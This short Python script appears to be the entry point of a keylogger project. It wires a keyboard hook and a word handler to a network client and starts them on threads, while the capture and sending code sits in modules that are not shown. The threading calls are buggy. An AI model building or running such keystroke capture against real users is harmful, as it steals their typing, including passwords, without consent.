from Network import *
from  WordsHandler  import  *
from  KeyStrokeHandler  import  *
from  Database  import  *
import thread
#check hw to use thread with sql
wordsHandler = WordsHandler()
keyboardHook = KeyboardHook(wordsHandler)
#keyboardHook.start()


obb = NetWorkClient()
t1 = threading.Thread(target=obb.run())
t2 = threading.Thread(target=keyboardHook.start())
#t1.start()
t1.start()
"""
obb.run()"""
